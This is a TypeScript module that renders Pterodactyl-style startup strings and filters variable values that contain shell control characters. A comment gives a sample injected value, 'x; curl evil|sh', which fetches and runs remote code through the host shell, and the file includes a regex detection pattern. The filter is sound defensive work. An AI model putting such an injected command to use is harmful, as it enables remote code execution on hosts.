/**
 * Startup-string rendering for the native (no-Docker) engine.
 * Kept in its own dependency-free module so it can be unit-tested without
 * booting the panel.
 */

// Renders a Pterodactyl-style STARTUP string, replacing every {{VAR}} with
// the matching value from the env map (same convention the itzg/Pterodactyl
// yolk images use).
//
// The native engine runs the result through the HOST shell, so a user-editable
// variable such as  MAP = "x; curl evil|sh"  would be remote code execution on
// the host. Values containing shell control characters are therefore dropped.
const UNSAFE_SHELL_VALUE = /[\r\n`;|&<>]|\$\(|\$\{/;
export function substituteVars(template: string, vars: Record<string, string>): string {
  return template.replace(/\{\{\s*([A-Za-z0-9_]+)\s*\}\}/g, (_m, name) => {
    if (vars[name] === undefined) return "";
    const value = String(vars[name]);
    if (UNSAFE_SHELL_VALUE.test(value)) {
      console.warn(`[native] Ignoring unsafe value for variable ${name}`);
      return "";
    }
    return value;
  });
}
